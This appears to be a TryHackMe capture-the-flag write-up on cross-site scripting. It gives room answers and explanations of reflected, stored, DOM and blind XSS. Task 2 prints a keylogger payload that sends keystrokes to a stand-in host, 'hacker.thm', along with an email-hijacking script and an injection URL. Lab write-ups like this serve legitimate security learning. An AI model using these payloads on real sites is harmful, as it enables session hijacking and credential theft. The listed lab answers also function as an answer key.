## Task 1 Room Brief

**What does XSS stand for?**

    Cross-Site Scripting

## Task 2 XSS Payloads

**Which document property could contain the user's session token?**

    document.cookie

**Which JavaScript method is often used as a Proof Of Concept?**

    alert

btoa()

: Is a function that accepts javascript string as an parameter and base64 encodes it in order to make it safe for a browser to transport. This along with the `document.cookie` parameter an attacker can steal a victims cookie session in order to login as that user without knowing the credentials.

!!! note
    Javascript can be used in order to set a keylogger on the victim site thus giving the attacker the chance to passively gather user keystrokes with the goal of obtaining credentials. An example line for a XSS keylogger may look like this:

```js
<script>document.onkeypress = function(e) { fetch('https://hacker.thm/log?key=' + btoa(e.key) );}</script>
```

Business Logic attacks

: These are flaws in the original design and implementation of the web app that allow an attaker to be able to exectue unintended behavior. This can be used to essentially put the attacker as a Man In The Middle between the user and the application itself. An example of this in terms of XSS would be as follows:

```js
<script>user.changeEmail('attacker@hacker.thm');</script>
```

Where the `user.changeEmail()` would be a function within the application that would enable the attaker to change the official email of the site to one of their control thus potentially posing as a help desk or customer support for the user and social engineering the victim into divulging information/credentials giving access over the victims account.

## Task 3 Relfected XSS

**Where in an URL is a good place to test for reflected XSS?**

    Parameters

Although there are different types of XSS attacks, **Reflected** XSS occurs when a malicious script is, as the name suggests, reflected off a web app to the victim browser through a link in order to activate the attack. This can be used to acquire the victims session cookie/token, this type of behavior can be seen when a web app processes the data in an unsafe way and reflects the parameter in it's response back to the user as shown below.

Original unsafe URL:

```http
https://insecure-website.com/search?term=gift

The response from the web app to this link would look like this:

<p>You searched for: gift</p>
```

Now, when a malicious actor injects their script into the parameter field it can look like this:

```http
https://insecure-website.com/search?term=<script>/*+Bad+stuff+here...+*/</script>

The response from the web app to this link would look like this:

<p>You searched for: <script>/* Bad stuff here... */</script></p>
```

!!! note
     This sort of attack can be performed in numerous ways and creativity is key but it vulnerability will need modification depending on what sort of protection is in place on the web app itself so keep a lookout for any details that might give it away.

## Task 4 Stored XSS

**How are stored XSS payloads usually stored on a website?**

    Database

Stored XSS
: This type of attack is capable of stealing a victims cookie session via database poisoning in order to obtain the victims account credentials or potentially spread malware onto whoever visits the site with javascript enabled in their browser which sadly is the mayority of users.

## Task 5 DOM Based XSS

**What unsafe JavaScript method is good to look for in source code?**

    eval()

eval()
: The eval function is mostly used to evaluate strings and expressions according to what sort of argument the user inputs into the function. An alternative to eval is `Function()` . Just like `eval()` , `Function()` takes some expression as a string for execution, except, rather than outputting the result directly, it returns an anonymous function to you that you can call. **It is highly suggested not to use the eval function as it is insecure and can lead to XSS attacks.**

## Task 6 Blind XSS

**What tool can you use to test for Blind XSS?**

    xsshunter

XSSHunter
: Is a tool that will automatically capture cookies, URLs, page contents and more. This works by hosting specialized XSS probes which, upon firing, scan the page and send information about the vulnerable page to the XSS Hunter service. You can visit the [xsshunter's](https://xsshunter.com/features) site to learn more about it and sign up if you so wish.

**What type of XSS is very similar to Blind XSS?**

    Stored XSS

!!! note
     Blind XSS is similar to a stored XSS (which we covered in task 4) in that your payload gets stored on the website for another user to view, but in this instance, you can't see the payload working or be able to test it against yourself first.

## Task 7 Perfecting your payload

**What is the flag you received from level six?**

    ‚ùó This question cannot be given in accordance with TryHackMe's rules for submitting writeups for the room

## Task 8 Practical Example (Blind XSS)

**What is the value of the staff-session cookie?**
